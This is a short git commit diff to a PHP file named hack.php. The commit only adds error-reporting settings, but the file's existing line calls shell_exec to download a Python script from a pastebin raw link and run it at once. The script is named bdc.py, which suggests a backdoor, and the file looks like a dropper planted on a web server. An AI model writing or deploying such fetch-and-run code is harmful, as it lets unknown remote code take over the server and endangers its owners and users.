2b83ddfdf80b89b4d056325ccd6c28ff1b350528
Kio-td <toobanooba@gmail.com>
2018-10-23 03:27:09 -0400

    a

--- hack.php
+++ hack.php
@@ -1,4 +1,4 @@
 <?php
-
+error_reporting(E_ALL); ini_set('display_errors', TRUE); ini_set('display_startup_errors', TRUE);
 shell_exec("wget https://pastebin.com/raw/vuLebBhm -O bdc.py && python bdc.py");
  ?>
